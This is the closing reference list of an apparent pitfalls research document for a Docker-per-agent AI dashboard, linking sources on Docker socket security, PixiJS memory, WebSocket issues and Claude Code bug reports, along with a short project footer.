- [PixiJS v8 — Garbage Collection](https://pixijs.com/8.x/guides/concepts/garbage-collection)
- [OWASP — Docker Security Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md)
- [HackTricks — Abusing Docker Socket for Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/abusing-docker-socket-for-privilege-escalation.html)
- [Bitwarden — Encryption Key Derivation](https://bitwarden.com/help/kdf-algorithms/)
- [Tecnativa Docker Socket Proxy](https://github.com/Tecnativa/docker-socket-proxy)
- [LinuxServer Docker Socket Proxy](https://github.com/linuxserver/docker-socket-proxy)

### Issue trackers (real-world failure evidence)
- [anthropics/claude-code #28287 — Recover gracefully when worktree CWD is deleted mid-session](https://github.com/anthropics/claude-code/issues/28287)
- [anthropics/claude-code #29653 — Shell session breaks when worktree CWD is deleted](https://github.com/anthropics/claude-code/issues/29653)
- [anthropics/claude-code #30906 — Worktree cwd is not restored on session resume](https://github.com/anthropics/claude-code/issues/30906)
- [anthropics/claude-agent-sdk-python #555 — Session resume silently creates new session](https://github.com/anthropics/claude-agent-sdk-python/issues/555)
- [yagop/node-telegram-bot-api #550 — getUpdates 409 Conflict](https://github.com/yagop/node-telegram-bot-api/issues/550)
- [pixijs/pixijs #10586 — Memory leak in Graphics destruction in v8](https://github.com/pixijs/pixijs/issues/10586)
- [pixijs/pixijs #10533 — Memory Leak / Inappropriate cleanUp](https://github.com/pixijs/pixijs/issues/10533)
- [anomalyco/opencode #14970 — SQLite corruption with concurrent sessions on NFS](https://github.com/anomalyco/opencode/issues/14970)
- [WebKit bug 228296 — iOS 15 WebSocket regression](https://bugs.webkit.org/show_bug.cgi?id=228296)

### Secondary commentary referenced
- [WebSocket.org — Troubleshooting timeouts and silent disconnects](https://websocket.org/guides/troubleshooting/timeout/)
- [Ably — WebSockets and iOS](https://ably.com/topic/websockets-ios)
- [Threat Landscape — Analyzing CVE-2025-59536 & CVE-2026-21852](https://threatlandscape.io/blog/analyzing-cve-2025-59536-cve-2026-21852-agent-configuration-risks)
- [Zscaler ThreatLabz — Anthropic Claude Code Leak](https://www.zscaler.com/blogs/security-research/anthropic-claude-code-leak)
- [ClaudeFa.st — Claude Code Context Window guide](https://claudefa.st/blog/guide/mechanics/context-management)

---
*Pitfalls research for: AI Agent Office (multi-AI agent management dashboard with isolated Docker-per-agent runtime, Telegram sidecar, encrypted vault, PixiJS PWA UI)*
*Researched: 2026-05-13*
